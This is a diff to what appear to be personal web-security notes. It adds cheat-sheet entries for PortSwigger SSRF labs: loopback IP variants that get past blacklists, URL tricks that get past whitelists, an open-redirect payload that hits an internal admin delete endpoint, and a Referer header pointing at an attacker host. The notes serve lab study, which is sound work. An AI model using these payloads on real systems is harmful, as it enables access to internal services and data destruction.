@@ -132,6 +132,7 @@ print(double_url_encode_payload(encoded_payload))
 print("\n[!] Another option that might work via something like BURP:")
 print(another_option(encoded_payload))
 ```
+</details>
 
 
 #### Format JSON using jq
@@ -139,3 +140,26 @@ print(another_option(encoded_payload))
 jq -r 'fromjson' escaped.json > clean.json
 ```
 
+
+#### Portswigger labs
+
+- ##### SSRF with blacklist-based input filters
+Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1 if 127.0.0.1 is blocked.      
+Example - http://127.1/admin, http://127.1/<url encode/ double url encode of admin>
+
+- ##### SSRF with whitelist-based input filters
+```
+https://localhost#expected-host
+https://expected-host:fakepassword@localhost
+https://expected-host.evil-host
+```
+
+- ##### SSRF with filter bypass via open redirection vulnerability
+```
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+```
+
+- ##### Blind SSRF via the Referer header
+```
+Referer: http://attacker-ip
+```
